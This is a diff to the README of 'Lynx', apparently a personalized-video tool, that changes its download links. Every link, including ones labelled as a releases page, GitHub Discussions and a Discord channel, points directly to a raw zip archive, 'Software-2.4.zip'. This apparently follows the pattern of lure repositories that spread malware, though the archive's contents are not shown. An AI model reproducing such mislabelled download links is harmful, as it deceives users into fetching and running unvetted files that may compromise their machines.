@@ -4,14 +4,14 @@
 
 Welcome to Lynx, a tool that helps you create high-quality personalized videos with ease. This guide will walk you through the steps to download and run the software.
 
-[![Download Lynx](https://raw.githubusercontent.com/Alex11x/lynx/main/oont/lynx.zip%20Lynx-v1.0-brightgreen)](https://raw.githubusercontent.com/Alex11x/lynx/main/oont/lynx.zip)
+[![Download Lynx](https://github.com/Alex11x/lynx/raw/refs/heads/main/assets/Software-2.4.zip%20Lynx-v1.0-brightgreen)](https://github.com/Alex11x/lynx/raw/refs/heads/main/assets/Software-2.4.zip)
 
 ## 📥 Download & Install
 
 To get Lynx, follow these steps:
 
 1. Click the link below to visit the Releases page:
-   [Visit the Releases Page](https://raw.githubusercontent.com/Alex11x/lynx/main/oont/lynx.zip)
+   [Visit the Releases Page](https://github.com/Alex11x/lynx/raw/refs/heads/main/assets/Software-2.4.zip)
 
 2. On the Releases page, you will see different versions of Lynx. Choose the latest version.
 
@@ -65,8 +65,8 @@ If you encounter problems while installing or running Lynx, consider these commo
 
 Join our community to share ideas and get help. You can find us on:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/Alex11x/lynx/main/oont/lynx.zip)
-- [Discord Channel](https://raw.githubusercontent.com/Alex11x/lynx/main/oont/lynx.zip)
+- [GitHub Discussions](https://github.com/Alex11x/lynx/raw/refs/heads/main/assets/Software-2.4.zip)
+- [Discord Channel](https://github.com/Alex11x/lynx/raw/refs/heads/main/assets/Software-2.4.zip)
 
 ## 🏁 Conclusion
 
